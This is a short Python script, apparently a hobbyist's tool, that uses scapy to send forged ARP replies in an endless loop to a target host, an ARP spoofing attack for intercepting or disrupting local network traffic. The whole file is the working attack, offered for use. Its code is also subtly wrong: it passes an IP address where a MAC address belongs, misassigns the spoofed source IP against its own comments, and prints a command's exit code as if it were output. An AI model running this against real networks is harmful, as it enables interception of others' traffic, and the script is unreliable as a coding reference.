import os
from scapy.layers.l2 import getmacbyip
from scapy.all import (
    ARP,
    Ether,
    sendp
)
ifconfig=os.system('ipconfig')
print(ifconfig)
gmac=input('Please enter gateway IP:')
liusheng=input('Please enter your IP:')
liusrc=input('Please enter target IP:')
try:
    tg=getmacbyip(liusrc)
    print(tg)

except Exception as f:
    print('[-]{}'.format(f))
    exit()
def arpspoof():
  try:
    eth=Ether()
    arp=ARP(
        op="is-at",#ARP响应
        hwsrc=gmac,#网关mac
        psrc=liusheng,#网关IP
        hwdst=tg,#目标Mac
        pdst=liusrc#目标IP
    )
    print((eth/arp).show())
    sendp(eth/arp,inter=2,loop=1)
  except Exception as g:
      print('[-]{}'.format(g))
      exit()
arpspoof()
